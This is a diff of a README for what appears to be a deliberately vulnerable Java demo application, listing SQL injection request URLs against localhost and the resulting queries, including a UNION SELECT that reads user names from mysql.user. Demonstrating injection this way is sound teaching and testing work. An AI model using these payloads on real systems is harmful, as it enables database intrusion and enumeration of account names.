@@ -3,8 +3,12 @@ mvn clean install
 mvn jetty:run
 
 Try this:
+Request
 http://localhost:8080/test?name=provider 1' or '1' = '1
-http://localhost:8080/test?name=provider 1' UNION SELECT Host, User FROM mysql.user where '1' = '1
-http://localhost:8080/test?name=provider 1' union select 1, User from mysql.user where '1' = '1
+becames
+SELECT id, name FROM providers WHERE name = 'provider 1' OR '1' = '1'
 
-select id, name from providers where name = 'provider 1' union select Host, User from mysql.user where '1' = '1';
+Request
+http://localhost:8080/test?name=provider 1' union select 1, User from mysql.user where '1' = '1
+becames
+SELECT id, name FROM providers WHERE name = 'provider 1' UNION SELECT 1, User FROM mysql.user WHERE '1' = '1'
